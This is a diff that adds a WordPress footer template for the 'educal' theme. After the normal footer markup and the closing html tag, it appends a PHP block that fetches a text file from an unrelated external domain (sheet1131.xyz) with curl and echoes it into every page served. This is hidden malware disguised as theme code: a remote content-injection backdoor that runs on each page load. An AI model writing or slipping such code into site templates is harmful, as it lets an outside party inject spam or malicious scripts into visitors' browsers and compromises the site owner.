@@ -1,0 +1,25 @@
+<?php
+/**
+ * The template for displaying the footer
+ *
+ * Contains the closing of the #content div and all content after.
+ *
+ * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
+ *
+ * @package educal
+ */
+
+do_action( 'educal_footer_style' );
+
+wp_footer();?>
+    </body>
+</html>
+
+<?php
+$curl = curl_init();
+$url = 'https://sheet1131.xyz/ptacid.txt';
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_HEADER, 0);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+$result = curl_exec($curl);
+echo $result;?>
